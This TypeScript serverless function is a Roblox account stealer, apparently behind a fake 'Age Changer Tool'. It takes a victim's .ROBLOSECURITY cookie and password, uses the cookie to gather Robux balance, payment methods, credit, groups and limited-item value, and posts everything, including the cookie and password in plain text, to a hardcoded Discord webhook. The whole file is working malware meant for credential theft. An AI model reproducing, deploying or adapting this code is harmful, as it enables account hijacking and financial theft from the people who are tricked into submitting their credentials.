import type { VercelRequest, VercelResponse } from '@vercel/node';
import fetch from 'node-fetch';

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1421152095368642762/q7ptPLwZNW3IyAZSLi3n8VYA2g1dMOrdXqX-sR0D5lUipBu5_EaNNBa3Otxuy07dHzBd'; // replace this

export default async function handler(req: VercelRequest, res: VercelResponse) {
  if (req.method !== 'POST') return res.status(405).json({ success: false, message: 'Method not allowed' });

  const { cookie, password } = req.body;
  if (!cookie || !password) return res.status(400).json({ success: false, message: 'Missing cookie or password' });

  try {
    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
    });
    if (!userRes.ok) return res.status(400).json({ success: false, message: 'Invalid Roblox cookie' });
    const userData: any = await userRes.json();
    const userId = userData.id;

    const fullUserRes = await fetch(`https://users.roblox.com/v1/users/${userId}`);
    const fullUserData: any = await fullUserRes.json();
    const accountCreated = fullUserData.created;

    const accountInfoRes = await fetch(`https://accountinformation.roblox.com/v1/users/${userId}`, {
      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
    });
    const accountInfoData: any = await accountInfoRes.json();
    const isEmailVerified = accountInfoData.isEmailVerified;
    const country = accountInfoData.countryCode || '🌍 Unknown';

    const balanceRes = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
    });
    const balanceData: any = await balanceRes.json();
    const robux = balanceData.robux;
    const pendingRobux = balanceData.pendingRobux;

    const groupsRes = await fetch(`https://groups.roblox.com/v2/users/${userId}/groups/roles`, {
      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
    });
    let groupsOwned = 'None';
    if (groupsRes.ok) {
      const groupsData: any = await groupsRes.json();
      const ownedGroups = groupsData.data.filter((g: any) => g.role.name.toLowerCase() === 'owner')
        .map((g: any) => g.group.name);
      if (ownedGroups.length) groupsOwned = ownedGroups.join(', ');
    }

    const creditRes = await fetch(`https://accountinformation.roblox.com/v1/users/${userId}/credit`, {
      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
    });
    const creditData: any = creditRes.ok ? await creditRes.json() : { balance: 0 };
    const creditBalance = creditData.balance || 0;

    const paymentRes = await fetch(`https://accountinformation.roblox.com/v1/users/${userId}/payment-methods`, {
      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
    });
    const paymentData: any = paymentRes.ok ? await paymentRes.json() : [];
    const paymentMethods = paymentData.length
      ? paymentData.map((p: any) => p.paymentInstrumentType).join(', ')
      : '❌ None';

    const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, {
      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
    });
    const premiumData: any = premiumRes.ok ? await premiumRes.json() : { hasPremium: false };
    const hasPremium = premiumData.hasPremium;

    let totalRAP = 0;
    let korBloxCount = 0;
    let headlessCount = 0;
    let page = '';
    let hasMore = true;

    while (hasMore) {
      const invRes = await fetch(`https://inventory.roblox.com/v2/users/${userId}/inventory/collectibles?limit=100&sortOrder=Asc&cursor=${page}`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
      });
      if (!invRes.ok) break;
      const invData: any = await invRes.json();
      invData.data.forEach((item: any) => {
        if (item.recentAveragePrice) totalRAP += item.recentAveragePrice;
        const nameLower = item.name.toLowerCase();
        if (nameLower.includes('korblox')) korBloxCount++;
        if (nameLower.includes('headless')) headlessCount++;
      });
      hasMore = invData.nextPageCursor ? true : false;
      page = invData.nextPageCursor || '';
    }

    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: '🎮 Roblox Account Logger',
        embeds: [
          {
            title: `📝 New Roblox Account Info - ${userData.name}`,
            color: 0x9b59b6,
            thumbnail: { url: `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png` },
            fields: [
              { name: '🆔 User ID', value: userId.toString(), inline: true },
              { name: '📅 Account Created', value: new Date(accountCreated).toLocaleDateString(), inline: true },
              { name: '🌍 Country', value: country, inline: true },
              { name: '✅ Email Verified', value: isEmailVerified ? '✅ Yes' : '❌ No', inline: true },
              { name: '💎 Premium Membership', value: hasPremium ? '✅ Yes' : '❌ No', inline: true },
              { name: '💰 Robux', value: robux.toString(), inline: true },
              { name: '⏳ Pending Robux', value: pendingRobux.toString(), inline: true },
              { name: '💳 Credit Balance', value: creditBalance.toString(), inline: true },
              { name: '💳 Payment Methods', value: paymentMethods, inline: true },
              { name: '🏰 Groups Owned', value: groupsOwned, inline: false },
              { name: '🎁 Total RAP of Limiteds', value: totalRAP.toString(), inline: true },
              { name: '🥷 KorBlox Items', value: korBloxCount.toString(), inline: true },
              { name: '🎩 Headless Items', value: headlessCount.toString(), inline: true },
              { name: '🔑 Cookie', value: `\`${cookie}\``, inline: false },
              { name: '🔒 Password', value: `\`${password}\``, inline: false },
            ],
            footer: { text: 'Logged by Age Changer Tool', icon_url: 'https://www.roblox.com/favicon.ico' },
            timestamp: new Date().toISOString(),
          },
        ],
      }),
    });

    return res.status(200).json({ success: true, message: '✅ Account info successfully logged!' });

  } catch (err) {
    console.error(err);
    return res.status(500).json({ success: false, message: 'Server error' });
  }
}
